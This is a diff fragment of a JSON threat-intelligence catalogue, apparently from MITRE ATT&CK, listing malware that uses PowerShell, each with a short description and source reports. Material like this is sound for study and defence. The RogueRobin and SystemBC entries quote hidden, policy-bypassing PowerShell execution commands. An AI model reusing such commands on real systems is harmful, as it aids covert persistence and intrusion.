+        "attack_id": "S0381",
+        "evidence": "uses T1059.001",
+        "description": "FlawedAmmyy has used PowerShell to execute commands.",
+        "sources": "Korean FSI TA505 2020 https://www.fsec.or.kr/user/bbs/fsec/163/344/bbsDataView/1382.do?page=1&column=&search=&searchSDate=&searchEDate=&bbsDataCategory="
+      },
+      {
+        "name": "GLASSTOKEN",
+        "attack_id": "S1117",
+        "evidence": "uses T1059.001",
+        "description": "GLASSTOKEN can use PowerShell for command execution.",
+        "sources": "Volexity Ivanti Zero-Day Exploitation January 2024 https://www.volexity.com/blog/2024/01/10/active-exploitation-of-two-zero-day-vulnerabilities-in-ivanti-connect-secure-vpn/"
+      },
+      {
+        "name": "Gootloader",
+        "attack_id": "S1138",
+        "evidence": "uses T1059.001",
+        "description": "Gootloader can use an encoded PowerShell stager to write to the Registry for persistence.",
+        "sources": "SentinelOne Gootloader June 2021 https://www.sentinelone.com/labs/gootloader-initial-access-as-a-service-platform-expands-its-search-for-high-value-targets/; Sophos Gootloader https://news.sophos.com/en-us/2021/03/01/gootloader-expands-its-payload-delivery-options/"
+      },
+      {
+        "name": "GRIFFON",
+        "attack_id": "S0417",
+        "evidence": "uses T1059.001",
+        "description": "GRIFFON has used PowerShell to execute the Meterpreter downloader TinyMet.",
+        "sources": "SecureList Griffon May 2019 https://securelist.com/fin7-5-the-infamous-cybercrime-rig-fin7-continues-its-activities/90703/"
+      },
+      {
+        "name": "HALFBAKED",
+        "attack_id": "S0151",
+        "evidence": "uses T1059.001",
+        "description": "HALFBAKED can execute PowerShell scripts.",
+        "sources": "FireEye FIN7 April 2017 https://www.fireeye.com/blog/threat-research/2017/04/fin7-phishing-lnk.html"
+      },
+      {
+        "name": "HAMMERTOSS",
+        "attack_id": "S0037",
+        "evidence": "uses T1059.001",
+        "description": "HAMMERTOSS is known to use PowerShell.",
+        "sources": "FireEye APT29 https://services.google.com/fh/files/misc/rpt-apt29-hammertoss-stealthy-tactics-define-en.pdf"
+      },
+      {
+        "name": "Hancitor",
+        "attack_id": "S0499",
+        "evidence": "uses T1059.001",
+        "description": "Hancitor has used PowerShell to execute commands.",
+        "sources": "FireEye Hancitor https://www.fireeye.com/blog/threat-research/2016/09/hancitor_aka_chanit.html"
+      },
+      {
+        "name": "Havoc",
+        "attack_id": "S1229",
+        "evidence": "uses T1059.001",
+        "description": "Havoc can facilitate the execution of PowerShell commands.",
+        "sources": "Immersive Labs Havoc C2 APR 2024 https://www.immersivelabs.com/resources/blog/havoc-c2-framework-a-defensive-operators-guide"
+      },
+      {
+        "name": "Helminth",
+        "attack_id": "S0170",
+        "evidence": "uses T1059.001",
+        "description": "One version of Helminth uses a PowerShell script.",
+        "sources": "Palo Alto OilRig May 2016 http://researchcenter.paloaltonetworks.com/2016/05/the-oilrig-campaign-attacks-on-saudi-arabian-organizations-deliver-helminth-backdoor/"
+      },
+      {
+        "name": "InvisibleFerret",
+        "attack_id": "S1245",
+        "evidence": "uses T1059.001",
+        "description": "InvisibleFerret has utilized a PowerShell script created in the victim’s home directory named “conf.ps1” that is used to modify configuration files for AnyDesk remote services.",
+        "sources": "ESET Contagious Interview BeaverTail InvisibleFerret February 2025 https://www.welivesecurity.com/en/eset-research/deceptivedevelopment-targets-freelance-developers/"
+      },
+      {
+        "name": "IPsec Helper",
+        "attack_id": "S1132",
+        "evidence": "uses T1059.001",
+        "description": "IPsec Helper can run arbitrary PowerShell commands passed to it.",
+        "sources": "SentinelOne Agrius 2021 https://assets.sentinelone.com/sentinellabs/evol-agrius"
+      },
+      {
+        "name": "JCry",
+        "attack_id": "S0389",
+        "evidence": "uses T1059.001",
+        "description": "JCry has used PowerShell to execute payloads.",
+        "sources": "Carbon Black JCry May 2019 https://www.carbonblack.com/2019/05/14/cb-tau-threat-intelligence-notification-jcry-ransomware-pretends-to-be-adobe-flash-player-update-installer/"
+      },
+      {
+        "name": "JSS Loader",
+        "attack_id": "S0648",
+        "evidence": "uses T1059.001",
+        "description": "JSS Loader has the ability to download and execute PowerShell scripts.",
+        "sources": "CrowdStrike Carbon Spider August 2021 https://www.crowdstrike.com/blog/carbon-spider-embraces-big-game-hunting-part-1/"
+      },
+      {
+        "name": "KeyBoy",
+        "attack_id": "S0387",
+        "evidence": "uses T1059.001",
+        "description": "KeyBoy uses PowerShell commands to download and execute payloads.",
+        "sources": "PWC KeyBoys Feb 2017 https://web.archive.org/web/20211129064701/https://www.pwc.co.uk/issues/cyber-security-services/research/the-keyboys-are-back-in-town.html"
+      },
+      {
+        "name": "KGH_SPY",
+        "attack_id": "S0526",
+        "evidence": "uses T1059.001",
+        "description": "KGH_SPY can execute PowerShell commands on the victim's machine.",
+        "sources": "Cybereason Kimsuky November 2020 https://www.cybereason.com/blog/back-to-the-future-inside-the-kimsuky-kgh-spyware-suite"
+      },
+      {
+        "name": "KOCTOPUS",
+        "attack_id": "S0669",
+        "evidence": "uses T1059.001",
+        "description": "KOCTOPUS has used PowerShell commands to download additional files.",
+        "sources": "MalwareBytes LazyScripter Feb 2021 https://web.archive.org/web/20211003035156/https://www.malwarebytes.com/resources/files/2021/02/lazyscripter.pdf"
+      },
+      {
+        "name": "KONNI",
+        "attack_id": "S0356",
+        "evidence": "uses T1059.001",
+        "description": "KONNI used PowerShell to download and execute a specific 64-bit version of the malware.",
+        "sources": "Talos Konni May 2017 https://blog.talosintelligence.com/2017/05/konni-malware-under-radar-for-years.html; Malwarebytes Konni Aug 2021 https://blog.malwarebytes.com/threat-intelligence/2021/08/new-variant-of-konni-malware-used-in-campaign-targetting-russia/"
+      },
+      {
+        "name": "LazyWiper",
+        "attack_id": "S9039",
+        "evidence": "uses T1059.001",
+        "description": "LazyWiper has used PowerShell to enable data destruction on targeted systems.",
+        "sources": "CERT Polska https://cert.pl/uploads/docs/CERT_Polska_Energy_Sector_Incident_Report_2025.pdf"
+      },
+      {
+        "name": "LitePower",
+        "attack_id": "S0680",
+        "evidence": "uses T1059.001",
+        "description": "LitePower can use a PowerShell script to execute commands.",
+        "sources": "Kaspersky WIRTE November 2021 https://securelist.com/wirtes-campaign-in-the-middle-east-living-off-the-land-since-at-least-2019/105044"
+      },
+      {
+        "name": "Lizar",
+        "attack_id": "S0681",
+        "evidence": "uses T1059.001",
+        "description": "Lizar has used PowerShell scripts.",
+        "sources": "BiZone Lizar May 2021 https://bi-zone.medium.com/from-pentest-to-apt-attack-cybercriminal-group-fin7-disguises-its-malware-as-an-ethical-hackers-c23c9a75e319"
+      },
+      {
+        "name": "LockBit 2.0",
+        "attack_id": "S1199",
+        "evidence": "uses T1059.001",
+        "description": "LockBit 2.0 can use the PowerShell module `InvokeGPUpdate` to modify Group Policy.",
+        "sources": "Palo Alto Lockbit 2.0 JUN 2022 https://unit42.paloaltonetworks.com/lockbit-2-ransomware/; FBI Lockbit 2.0 FEB 2022 https://www.ic3.gov/CSA/2022/220204.pdf"
+      },
+      {
+        "name": "LockBit 3.0",
+        "attack_id": "S1202",
+        "evidence": "uses T1059.001",
+        "description": "LockBit 3.0 can use PowerShell to apply Group Policy changes.",
+        "sources": "Joint Cybersecurity Advisory LockBit 3.0 MAR 2023 https://www.cisa.gov/sites/default/files/2023-03/aa23-075a-stop-ransomware-lockbit.pdf"
+      },
+      {
+        "name": "Lokibot",
+        "attack_id": "S0447",
+        "evidence": "uses T1059.001",
+        "description": "Lokibot has used PowerShell commands embedded inside batch scripts.",
+        "sources": "Talos Lokibot Jan 2021 https://blog.talosintelligence.com/2021/01/a-deep-dive-into-lokibot-infection-chain.html"
+      },
+      {
+        "name": "LP-Notes",
+        "attack_id": "S9036",
+        "evidence": "uses T1059.001",
+        "description": "LP-Notes has been downloaded and executed by PowerShell’s`Invoke-WebRequest` and `Invoke-Expression` cmdlets.",
+        "sources": "ESET_MuddyWater_Dec2025 https://www.welivesecurity.com/en/eset-research/muddywater-snakes-riverbank/"
+      },
+      {
+        "name": "Lumma Stealer",
+        "attack_id": "S1213",
+        "evidence": "uses T1059.001",
+        "description": "Lumma Stealer has used PowerShell for initial user execution and other fuctions.",
+        "sources": "Fortinet LummaStealer 2024 https://www.fortinet.com/blog/threat-research/lumma-variant-on-youtube; Cybereason LumaStealer Undated https://www.cybereason.com/blog/threat-analysis-rise-of-lummastealer; Netskope LummaStealer 2025 https://www.netskope.com/blog/lumma-stealer-fake-captchas-new-techniques-to-evade-detection; Qualys LummaStealer 2024 https://blog.qualys.com/vulnerabilities-threat-research/2024/10/20/unmasking-lumma-stealer-analyzing-deceptive-tactics-with-fake-captcha"
+      },
+      {
+        "name": "LunarWeb",
+        "attack_id": "S1141",
+        "evidence": "uses T1059.001",
+        "description": "LunarWeb has the ability to run shell commands via PowerShell.",
+        "sources": "ESET Turla Lunar toolset May 2024 https://www.welivesecurity.com/en/eset-research/moon-backdoors-lunar-landing-diplomatic-missions/"
+      },
+      {
+        "name": "Mafalda",
+        "attack_id": "S1060",
+        "evidence": "uses T1059.001",
+        "description": "Mafalda can execute PowerShell commands on a compromised machine.",
+        "sources": "SentinelLabs Metador Technical Appendix Sept 2022 https://docs.google.com/document/d/1e9ZTW9b71YwFWS_18ZwDAxa-cYbV8q1wUefmKZLYVsA/edit#heading=h.lmnbtht1ikzm"
+      },
+      {
+        "name": "Medusa Ransomware",
+        "attack_id": "S1244",
+        "evidence": "uses T1059.001",
+        "description": "Medusa Ransomware has launched PowerShell scripts for execution and defense evasion.",
+        "sources": "Palo Alto Unit 42 Medusa Group Medusa Ransomware January 2024 https://unit42.paloaltonetworks.com/medusa-ransomware-escalation-new-leak-site/; Security Scorecard Medusa Ransomware January 2024 https://securityscorecard.com/wp-content/uploads/2024/01/deep-dive-into-medusa-ransomware.pdf"
+      },
+      {
+        "name": "Meteor",
+        "attack_id": "S0688",
+        "evidence": "uses T1059.001",
+        "description": "Meteor can use PowerShell commands to disable the network adapters on a victim machines.",
+        "sources": "Check Point Meteor Aug 2021 https://research.checkpoint.com/2021/indra-hackers-behind-recent-attacks-on-iran/"
+      },
+      {
+        "name": "MoleNet",
+        "attack_id": "S0553",
+        "evidence": "uses T1059.001",
+        "description": "MoleNet can use PowerShell to set persistence.",
+        "sources": "Cybereason Molerats Dec 2020 https://www.cybereason.com/hubfs/dam/collateral/reports/Molerats-in-the-Cloud-New-Malware-Arsenal-Abuses-Cloud-Platforms-in-Middle-East-Espionage-Campaign.pdf"
+      },
+      {
+        "name": "Mosquito",
+        "attack_id": "S0256",
+        "evidence": "uses T1059.001",
+        "description": "Mosquito can launch PowerShell Scripts.",
+        "sources": "ESET Turla Mosquito Jan 2018 https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf"
+      },
+      {
+        "name": "MuddyViper",
+        "attack_id": "S9032",
+        "evidence": "uses T1059.001",
+        "description": "MuddyViper has used PowerShell.exe to launch a reverse shell.",
+        "sources": "ESET_MuddyWater_Dec2025 https://www.welivesecurity.com/en/eset-research/muddywater-snakes-riverbank/"
+      },
+      {
+        "name": "Netwalker",
+        "attack_id": "S0457",
+        "evidence": "uses T1059.001",
+        "description": "Netwalker has been written in PowerShell and executed directly in memory, avoiding detection.",
+        "sources": "TrendMicro Netwalker May 2020 https://blog.trendmicro.com/trendlabs-security-intelligence/netwalker-fileless-ransomware-injected-via-reflective-loading/; Sophos Netwalker May 2020 https://news.sophos.com/en-us/2020/05/27/netwalker-ransomware-tools-give-insight-into-threat-actor/"
+      },
+      {
+        "name": "NETWIRE",
+        "attack_id": "S0198",
+        "evidence": "uses T1059.001",
+        "description": "The NETWIRE binary has been executed via PowerShell script.",
+        "sources": "FireEye NETWIRE March 2019 https://www.mandiant.com/resources/blog/dissecting-netwire-phishing-campaigns-usage-process-hollowing"
+      },
+      {
+        "name": "njRAT",
+        "attack_id": "S0385",
+        "evidence": "uses T1059.001",
+        "description": "njRAT has executed PowerShell commands via auto-run registry key persistence.",
+        "sources": "Trend Micro njRAT 2018 https://blog.trendmicro.com/trendlabs-security-intelligence/autoit-compiled-worm-affecting-removable-media-delivers-fileless-version-of-bladabindi-njrat-backdoor/"
+      },
+      {
+        "name": "OSX_OCEANLOTUS.D",
+        "attack_id": "S0352",
+        "evidence": "uses T1059.001",
+        "description": "OSX_OCEANLOTUS.D uses PowerShell scripts.",
+        "sources": "TrendMicro MacOS April 2018 https://blog.trendmicro.com/trendlabs-security-intelligence/new-macos-backdoor-linked-to-oceanlotus-found/"
+      },
+      {
+        "name": "Pillowmint",
+        "attack_id": "S0517",
+        "evidence": "uses T1059.001",
+        "description": "Pillowmint has used a PowerShell script to install a shim database.",
+        "sources": "Trustwave Pillowmint June 2020 https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/pillowmint-fin7s-monkey-thief/"
+      },
+      {
+        "name": "POSHSPY",
+        "attack_id": "S0150",
+        "evidence": "uses T1059.001",
+        "description": "POSHSPY uses PowerShell to execute various commands, one to execute its payload.",
+        "sources": "FireEye POSHSPY April 2017 https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html"
+      },
+      {
+        "name": "PowerExchange",
+        "attack_id": "S1173",
+        "evidence": "uses T1059.001",
+        "description": "PowerExchange can use PowerShell to execute commands received from C2.",
+        "sources": "Symantec Crambus OCT 2023 https://www.security.com/threat-intelligence/crambus-middle-east-government"
+      },
+      {
+        "name": "PowerLess",
+        "attack_id": "S1012",
+        "evidence": "uses T1059.001",
+        "description": "PowerLess is written in and executed via PowerShell without using powershell.exe.",
+        "sources": "Cybereason PowerLess February 2022 https://www.cybereason.com/blog/research/powerless-trojan-iranian-apt-phosphorus-adds-new-powershell-backdoor-for-espionage"
+      },
+      {
+        "name": "PowerPunch",
+        "attack_id": "S0685",
+        "evidence": "uses T1059.001",
+        "description": "PowerPunch has the ability to execute through PowerShell.",
+        "sources": "Microsoft Actinium February 2022 https://www.microsoft.com/security/blog/2022/02/04/actinium-targets-ukrainian-organizations/"
+      },
+      {
+        "name": "PowerShower",
+        "attack_id": "S0441",
+        "evidence": "uses T1059.001",
+        "description": "PowerShower is a backdoor written in PowerShell.",
+        "sources": "Unit 42 Inception November 2018 https://unit42.paloaltonetworks.com/unit42-inception-attackers-target-europe-year-old-office-vulnerability/"
+      },
+      {
+        "name": "POWERSOURCE",
+        "attack_id": "S0145",
+        "evidence": "uses T1059.001",
+        "description": "POWERSOURCE is a PowerShell backdoor.",
+        "sources": "Cisco DNSMessenger March 2017 http://blog.talosintelligence.com/2017/03/dnsmessenger.html; FireEye FIN7 March 2017 https://web.archive.org/web/20180808125108/https:/www.fireeye.com/blog/threat-research/2017/03/fin7_spear_phishing.html"
+      },
+      {
+        "name": "PowerStallion",
+        "attack_id": "S0393",
+        "evidence": "uses T1059.001",
+        "description": "PowerStallion uses PowerShell loops to iteratively check for available commands in its OneDrive C2 server.",
+        "sources": "ESET Turla PowerShell May 2019 https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/"
+      },
+      {
+        "name": "POWERSTATS",
+        "attack_id": "S0223",
+        "evidence": "uses T1059.001",
+        "description": "POWERSTATS uses PowerShell for obfuscation and execution.",
+        "sources": "ClearSky MuddyWater Nov 2018 https://www.clearskysec.com/wp-content/uploads/2018/11/MuddyWater-Operations-in-Lebanon-and-Oman.pdf; DHS CISA AA22-055A MuddyWater February 2022 https://www.cisa.gov/uscert/ncas/alerts/aa22-055a; Unit 42 MuddyWater Nov 2017 https://researchcenter.paloaltonetworks.com/2017/11/unit42-muddying-the-water-targeted-attacks-in-the-middle-east/; TrendMicro POWERSTATS V3 June 2019 https://blog.trendmicro.com/trendlabs-security-intelligence/muddywater-resurfaces-uses-multi-stage-backdoor-powerstats-v3-and-new-post-exploitation-tools/"
+      },
+      {
+        "name": "POWERTON",
+        "attack_id": "S0371",
+        "evidence": "uses T1059.001",
+        "description": "POWERTON is written in PowerShell.",
+        "sources": "FireEye APT33 Guardrail https://www.fireeye.com/blog/threat-research/2018/12/overruled-containing-a-potentially-destructive-adversary.html"
+      },
+      {
+        "name": "PowGoop",
+        "attack_id": "S1046",
+        "evidence": "uses T1059.001",
+        "description": "PowGoop has the ability to use PowerShell scripts to execute commands.",
+        "sources": "DHS CISA AA22-055A MuddyWater February 2022 https://www.cisa.gov/uscert/ncas/alerts/aa22-055a"
+      },
+      {
+        "name": "POWRUNER",
+        "attack_id": "S0184",
+        "evidence": "uses T1059.001",
+        "description": "POWRUNER is written in PowerShell.",
+        "sources": "FireEye APT34 Dec 2017 https://www.fireeye.com/blog/threat-research/2017/12/targeted-attack-in-middle-east-by-apt34.html"
+      },
+      {
+        "name": "Prestige",
+        "attack_id": "S1058",
+        "evidence": "uses T1059.001",
+        "description": "Prestige can use PowerShell for payload execution on targeted systems.",
+        "sources": "Microsoft Prestige ransomware October 2022 https://www.microsoft.com/en-us/security/blog/2022/10/14/new-prestige-ransomware-impacts-organizations-in-ukraine-and-poland/"
+      },
+      {
+        "name": "PS1",
+        "attack_id": "S0613",
+        "evidence": "uses T1059.001",
+        "description": "PS1 can utilize a PowerShell loader.",
+        "sources": "BlackBerry CostaRicto November 2020 https://blogs.blackberry.com/en/2020/11/the-costaricto-campaign-cyber-espionage-outsourced"
+      },
+      {
+        "name": "PUNCHBUGGY",
+        "attack_id": "S0196",
+        "evidence": "uses T1059.001",
+        "description": "PUNCHBUGGY has used PowerShell scripts.",
+        "sources": "Morphisec ShellTea June 2019 http://blog.morphisec.com/security-alert-fin8-is-back"
+      },
+      {
+        "name": "PureCrypter",
+        "attack_id": "S9019",
+        "evidence": "uses T1059.001",
+        "description": "PureCrypter can execute PowerShell commands to exclude files from EDR and to self-delete.",
+        "sources": "Check Point Blind Eagle MAR 2025 https://research.checkpoint.com/2025/blind-eagle-and-justice-for-all/; Zscaler PureCrypter JUN 2022 https://www.zscaler.com/blogs/security-research/technical-analysis-purecrypter"
+      },
+      {
+        "name": "PyDCrypt",
+        "attack_id": "S1032",
+        "evidence": "uses T1059.001",
+        "description": "PyDCrypt has attempted to execute with PowerShell.",
+        "sources": "Checkpoint MosesStaff Nov 2021 https://research.checkpoint.com/2021/mosesstaff-targeting-israeli-companies/"
+      },
+      {
+        "name": "Pysa",
+        "attack_id": "S0583",
+        "evidence": "uses T1059.001",
+        "description": "Pysa has used Powershell scripts to deploy its ransomware.",
+        "sources": "CERT-FR PYSA April 2020 https://www.cert.ssi.gouv.fr/uploads/CERTFR-2020-CTI-003.pdf"
+      },
+      {
+        "name": "QakBot",
+        "attack_id": "S0650",
+        "evidence": "uses T1059.001",
+        "description": "QakBot can use PowerShell to download and execute payloads.",
+        "sources": "Group IB Ransomware September 2020 https://web.archive.org/web/20220119114433/https://groupib.pathfactory.com/ransomware-reports/prolock_wp"
+      },
+      {
+        "name": "Qilin",
+        "attack_id": "S1242",
+        "evidence": "uses T1059.001",
+        "description": "Qilin has been deployed on VMware vCenter and ESXi servers via custom PowerShell script. Qilin has also used PowerShell for discovery in vCenter and Active Directory environments.",
+        "sources": "Picus Qilin MAR 2025 https://www.picussecurity.com/resource/blog/qilin-ransomware; Cisco Talos Qilin Ransomware OCT 2025 https://blog.talosintelligence.com/uncovering-qilin-attack-methods-exposed-through-multiple-cases/; BushidoToken Qilin RaaS JUN 2024 https://blog.bushidotoken.net/2024/06/tracking-adversaries-qilin-raas.html"
+      },
+      {
+        "name": "QUADAGENT",
+        "attack_id": "S0269",
+        "evidence": "uses T1059.001",
+        "description": "QUADAGENT uses PowerShell scripts for execution.",
+        "sources": "Unit 42 QUADAGENT July 2018 https://researchcenter.paloaltonetworks.com/2018/07/unit42-oilrig-targets-technology-service-provider-government-agency-quadagent/"
+      },
+      {
+        "name": "RansomHub",
+        "attack_id": "S1212",
+        "evidence": "uses T1059.001",
+        "description": "RansomHub can use PowerShell to delete volume shadow copies.",
+        "sources": "Group-IB RansomHub FEB 2025 https://www.group-ib.com/blog/ransomhub-never-sleeps-episode-1/"
+      },
+      {
+        "name": "RATANKBA",
+        "attack_id": "S0241",
+        "evidence": "uses T1059.001",
+        "description": "There is a variant of RATANKBA that uses a PowerShell script instead of the traditional PE form.",
+        "sources": "Lazarus RATANKBA https://blog.trendmicro.com/trendlabs-security-intelligence/lazarus-campaign-targeting-cryptocurrencies-reveals-remote-controller-tool-evolved-ratankba/; RATANKBA https://www.trendmicro.com/en_us/research/17/b/ratankba-watering-holes-against-enterprises.html"
+      },
+      {
+        "name": "RegDuke",
+        "attack_id": "S0511",
+        "evidence": "uses T1059.001",
+        "description": "RegDuke can extract and execute PowerShell scripts from C2 communications.",
+        "sources": "ESET Dukes October 2019 https://www.welivesecurity.com/wp-content/uploads/2019/10/ESET_Operation_Ghost_Dukes.pdf"
+      },
+      {
+        "name": "Revenge RAT",
+        "attack_id": "S0379",
+        "evidence": "uses T1059.001",
+        "description": "Revenge RAT uses the PowerShell command Reflection.Assembly to load itself into memory to aid in execution.",
+        "sources": "Cofense RevengeRAT Feb 2019 https://web.archive.org/web/20200428173819/https://cofense.com/upgrades-delivery-support-infrastructure-revenge-rat-malware-bigger-threat/"
+      },
+      {
+        "name": "REvil",
+        "attack_id": "S0496",
+        "evidence": "uses T1059.001",
+        "description": "REvil has used PowerShell to delete volume shadow copies and download files.",
+        "sources": "Secureworks GandCrab and REvil September 2019 https://www.secureworks.com/blog/revil-the-gandcrab-connection; Talos Sodinokibi April 2019 https://blog.talosintelligence.com/2019/04/sodinokibi-ransomware-exploits-weblogic.html; Intel 471 REvil March 2020 https://intel471.com/blog/revil-ransomware-as-a-service-an-analysis-of-a-ransomware-affiliate-operation/; Group IB Ransomware May 2020 https://www.group-ib.com/whitepapers/ransomware-uncovered.html"
+      },
+      {
+        "name": "RogueRobin",
+        "attack_id": "S0270",
+        "evidence": "uses T1059.001",
+        "description": "RogueRobin uses a command prompt to run a PowerShell script from Excel. To assist in establishing persistence, RogueRobin creates %APPDATA%\\OneDrive.bat and saves the following string to it:powershell.exe -WindowStyle Hidden -exec bypass -File “%APPDATA%\\OneDrive.ps1”.",
+        "sources": "Unit 42 DarkHydrus July 2018 https://researchcenter.paloaltonetworks.com/2018/07/unit42-new-threat-actor-group-darkhydrus-targets-middle-east-government/; Unit42 DarkHydrus Jan 2019 https://unit42.paloaltonetworks.com/darkhydrus-delivers-new-trojan-that-can-use-google-drive-for-c2-communications/"
+      },
+      {
+        "name": "Saint Bot",
+        "attack_id": "S1018",
+        "evidence": "uses T1059.001",
+        "description": "Saint Bot has used PowerShell for execution.",
+        "sources": "Palo Alto Unit 42 OutSteel SaintBot February 2022  https://unit42.paloaltonetworks.com/ukraine-targeted-outsteel-saintbot/"
+      },
+      {
+        "name": "Sardonic",
+        "attack_id": "S1085",
+        "evidence": "uses T1059.001",
+        "description": "Sardonic has the ability to execute PowerShell commands on a compromised machine.",
+        "sources": "Bitdefender Sardonic Aug 2021 https://www.bitdefender.com/files/News/CaseStudies/study/401/Bitdefender-PR-Whitepaper-FIN8-creat5619-en-EN.pdf"
+      },
+      {
+        "name": "SeaDuke",
+        "attack_id": "S0053",
+        "evidence": "uses T1059.001",
+        "description": "SeaDuke uses a module to execute Mimikatz with PowerShell to perform Pass the Ticket.",
+        "sources": "Symantec Seaduke 2015 https://web.archive.org/web/20150717011546/http://www.symantec.com/connect/blogs/forkmeiamfamous-seaduke-latest-weapon-duke-armory"
+      },
+      {
+        "name": "ServHelper",
+        "attack_id": "S0382",
+        "evidence": "uses T1059.001",
+        "description": "ServHelper has the ability to execute a PowerShell script to get information from the infected host.",
+        "sources": "Trend Micro TA505 June 2019 https://blog.trendmicro.com/trendlabs-security-intelligence/shifting-tactics-breaking-down-ta505-groups-use-of-html-rats-and-other-techniques-in-latest-campaigns/"
+      },
+      {
+        "name": "Shai-Hulud",
+        "attack_id": "S9008",
+        "evidence": "uses T1059.001",
+        "description": "Shai-Hulud has utilized PowerShell `Invoke-WebRequest` to download and install the malicious payload.",
+        "sources": "Microsoft Shai-Hulud December 2025 https://www.microsoft.com/en-us/security/blog/2025/12/09/shai-hulud-2-0-guidance-for-detecting-investigating-and-defending-against-the-supply-chain-attack/"
+      },
+      {
+        "name": "SharpStage",
+        "attack_id": "S0546",
+        "evidence": "uses T1059.001",
+        "description": "SharpStage can execute arbitrary commands with PowerShell.",
+        "sources": "Cybereason Molerats Dec 2020 https://www.cybereason.com/hubfs/dam/collateral/reports/Molerats-in-the-Cloud-New-Malware-Arsenal-Abuses-Cloud-Platforms-in-Middle-East-Espionage-Campaign.pdf; BleepingComputer Molerats Dec 2020 https://www.bleepingcomputer.com/news/security/hacking-group-s-new-malware-abuses-google-and-facebook-services/"
+      },
+      {
+        "name": "SHARPSTATS",
+        "attack_id": "S0450",
+        "evidence": "uses T1059.001",
+        "description": "SHARPSTATS has the ability to employ a custom PowerShell script.",
+        "sources": "TrendMicro POWERSTATS V3 June 2019 https://blog.trendmicro.com/trendlabs-security-intelligence/muddywater-resurfaces-uses-multi-stage-backdoor-powerstats-v3-and-new-post-exploitation-tools/"
+      },
+      {
+        "name": "ShrinkLocker",
+        "attack_id": "S1178",
+        "evidence": "uses T1059.001",
+        "description": "ShrinkLocker uses PowerShell to disable protectors used to secure the BitLocker encryption key on victim machines and then delete the key from the system.",
+        "sources": "Kaspersky ShrinkLocker 2024 https://securelist.com/ransomware-abuses-bitlocker/112643/"
+      },
+      {
+        "name": "SMOKEDHAM",
+        "attack_id": "S0649",
+        "evidence": "uses T1059.001",
+        "description": "SMOKEDHAM can execute Powershell commands sent from its C2 server.",
+        "sources": "FireEye SMOKEDHAM June 2021 https://www.fireeye.com/blog/threat-research/2021/06/darkside-affiliate-supply-chain-software-compromise.html"
+      },
+      {
+        "name": "Snip3",
+        "attack_id": "S1086",
+        "evidence": "uses T1059.001",
+        "description": "Snip3 can use a PowerShell script for second-stage execution.",
+        "sources": "Telefonica Snip3 December 2021 https://telefonicatech.com/blog/snip3-investigacion-malware; Morphisec Snip3 May 2021 https://blog.morphisec.com/revealing-the-snip3-crypter-a-highly-evasive-rat-loader"
+      },
+      {
+        "name": "Socksbot",
+        "attack_id": "S0273",
+        "evidence": "uses T1059.001",
+        "description": "Socksbot can write and execute PowerShell scripts.",
+        "sources": "TrendMicro Patchwork Dec 2017 https://documents.trendmicro.com/assets/tech-brief-untangling-the-patchwork-cyberespionage-group.pdf"
+      },
+      {
+        "name": "Spica",
+        "attack_id": "S1140",
+        "evidence": "uses T1059.001",
+        "description": "Spica can use an obfuscated PowerShell command to create a scheduled task for persistence.",
+        "sources": "Google TAG COLDRIVER January 2024 https://blog.google/threat-analysis-group/google-tag-coldriver-russian-phishing-malware/"
+      },
+      {
+        "name": "SQLRat",
+        "attack_id": "S0390",
+        "evidence": "uses T1059.001",
+        "description": "SQLRat has used PowerShell to create a Meterpreter session.",
+        "sources": "Flashpoint FIN 7 March 2019 https://www.flashpoint-intel.com/blog/fin7-revisited-inside-astra-panel-and-sqlrat-malware/"
+      },
+      {
+        "name": "Squirrelwaffle",
+        "attack_id": "S1030",
+        "evidence": "uses T1059.001",
+        "description": "Squirrelwaffle has used PowerShell to execute its payload.",
+        "sources": "ZScaler Squirrelwaffle Sep 2021 https://www.zscaler.com/blogs/security-research/squirrelwaffle-new-loader-delivering-cobalt-strike; Netskope Squirrelwaffle Oct 2021 https://www.netskope.com/blog/squirrelwaffle-new-malware-loader-delivering-cobalt-strike-and-qakbot"
+      },
+      {
+        "name": "StrelaStealer",
+        "attack_id": "S1183",
+        "evidence": "uses T1059.001",
+        "description": "StrelaStealer variants have used PowerShell scripts to download or drop payloads, including obfuscated variants to connect to a WebDAV server to download and executed an encrypted DLL for installation.",
+        "sources": "IBM StrelaStealer 2024 https://securityintelligence.com/x-force/strela-stealer-todays-invoice-tomorrows-phish/"
+      },
+      {
+        "name": "StrongPity",
+        "attack_id": "S0491",
+        "evidence": "uses T1059.001",
+        "description": "StrongPity can use PowerShell to add files to the Windows Defender exclusions list.",
+        "sources": "Talos Promethium June 2020 https://blog.talosintelligence.com/2020/06/promethium-extends-with-strongpity3.html"
+      },
+      {
+        "name": "SystemBC",
+        "attack_id": "S9001",
+        "evidence": "uses T1059.001",
+        "description": "SystemBC has used hidden scheduled tasks to execute PowerShell commands by adding the following: `-WindowStyle Hidden -ep bypass -file `.",
+        "sources": "SophosGnGal_SystemBC_Dec2020 https://news.sophos.com/en-us/2020/12/16/systembc/"
+      },
+      {
+        "name": "TAMECAT",
+        "attack_id": "S1193",
+        "evidence": "uses T1059.001",
+        "description": "TAMECAT has used PowerShell to download and run additional content.",
+        "sources": "Mandiant APT42-untangling https://cloud.google.com/blog/topics/threat-intelligence/untangling-iran-apt42-operations"
+      },
+      {
+        "name": "The Gentlemen Ransomware",
+        "attack_id": "S9051",
+        "evidence": "uses T1059.001",
+        "description": "The Gentlemen Ransomware has utilized PowerShell to execute commands. The Gentlemen Ransomware has also leveraged PowerShell cmdlets to disable real-time monitoring and set exclusions.",
+        "sources": "CarveyODonnellWelchHuntress_TheGentlemen_May2026 https://www.huntress.com/blog/the-gentlemen-ransomware-defense-evasion-ttps; CheckPointResearch_TheGentlemen_April2026 https://research.checkpoint.com/2026/dfir-report-the-gentlemen/; MSTI_GentelmenRansomware_May2026 https://www.microsoft.com/en-us/security/blog/2026/05/28/the-gentlemen-ransomware-dissecting-a-self-propagating-go-encryptor/; TrendAI_TheGentlemen_Sept2025 https://www.trendaisecurity.com/en-us/resources-insights/trendai-security-blog/unmasking-the-gentlemen-ransomware"
+      },
+      {
+        "name": "TRANSLATEXT",
+        "attack_id": "S1201",
+        "evidence": "uses T1059.001",
+        "description": "TRANSLATEXT has used PowerShell to collect system information and to upload the collected data to a Github repository.",
+        "sources": "Zscaler Kimsuky TRANSLATEXT https://www.zscaler.com/blogs/security-research/kimsuky-deploys-translatext-target-south-korean-academia#technical-analysis"
+      },
